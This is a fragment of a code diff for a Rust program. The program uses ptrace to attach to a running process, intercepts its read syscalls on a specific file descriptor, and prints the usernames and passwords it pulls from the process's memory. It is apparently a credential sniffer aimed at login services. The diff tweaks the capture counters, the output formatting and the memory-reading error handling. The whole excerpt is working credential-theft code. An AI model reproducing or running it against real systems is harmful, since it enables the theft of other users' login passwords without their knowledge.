@@ -95,13 +95,13 @@ pub fn debugTHREAD(pid: Pid) {
                     if (0..5).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) && decoder(pid, reg.rsi as AddressType).is_ascii() {
                         count += 1;
                         
-                        if !decoder(pid, reg.rsi as AddressType).is_empty() {
-                            println!("\n\n{} Username: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
+                        if !decoder(pid, reg.rsi as AddressType).is_empty(){
+                            println!("{} Username: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
                         }
 
-                    } else if (5..).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) && decoder(pid, reg.rsi as AddressType).is_ascii() {
-                        
-                        if !decoder(pid, reg.rsi as ptrace::AddressType).is_empty() {
+                    } else if (5..12).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) && decoder(pid, reg.rsi as AddressType).is_ascii() {
+
+                        if !decoder(pid, reg.rsi as AddressType).is_empty() {
                             println!("\n{} Password: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
                         }
 
@@ -121,13 +121,11 @@ pub fn decoder(pid: Pid, addr: AddressType) -> String {
     let mut string = String::new();
     let mut check = 0;
 
-    'done: loop {
+    loop {
 
         let mut bytes: Vec<_> = Vec::new();
-        let res = match ptrace::read(pid, addr as AddressType) {
-                            Ok(s) => s,
-                            Err(_) => break 'done,
-                        };
+        let res = nix::sys::ptrace::read(pid, addr as nix::sys::ptrace::AddressType).unwrap();
+
 
         bytes.write_i64::<LittleEndian>(res).unwrap_or_else(|err| {
             panic!("Error to write {} as i64 LittleEndian: {}", res, err);
